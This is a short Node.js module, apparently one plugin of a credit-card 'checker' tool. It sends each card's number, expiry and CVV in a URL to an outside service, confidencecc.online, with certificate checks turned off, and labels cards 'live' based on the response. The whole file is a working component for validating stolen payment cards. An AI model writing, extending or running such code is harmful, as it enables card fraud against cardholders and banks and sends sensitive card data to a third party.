const { getConfig } = require('../../configManager')
const request = require('request-promise')

module.exports = async function confidence(card) {
  const { retrys, confidence: configs } = getConfig('checkers')

  const tester = ['debit', 1].includes(configs.tester) ? 1 : 0

  try {
    const options = {
      url: `https://confidencecc.online/client/rest-api/${configs.user}/${configs.pass}/${tester}/${card.number}|${card.month}|${card.year}|${card.cvv}`,
      method: 'GET',
      rejectUnauthorized: false,
      strictSSL: false,
      timeout: 100000,
    }

    const response = JSON.parse(await request(options))

    console.log(response)

    if (response.status == 1) {
      return {
        live: true,
        active: true,
        output: response,
      }
    } else if (
      response.gatewayResponse.includes('Chave') ||
      response.gatewayResponse.includes('Indentificado')
    ) {
      return {
        active: true,
        live: false,
        skip: true,
        output: response,
      }
    } else if (response.status == 0) {
      return {
        live: false,
        active: true,
        output: response,
      }
    } else if (response.status == -1) {
      return {
        active: true,
        live: false,
        skip: true,
        output: response,
      }
    } else {
      return {
        active: true,
        live: false,
        skip: true,
        output: response,
      }
    }
  } catch (e) {
    return {
      active: true,
      live: false,
      skip: true,
      output: e.message,
    }
  }
}
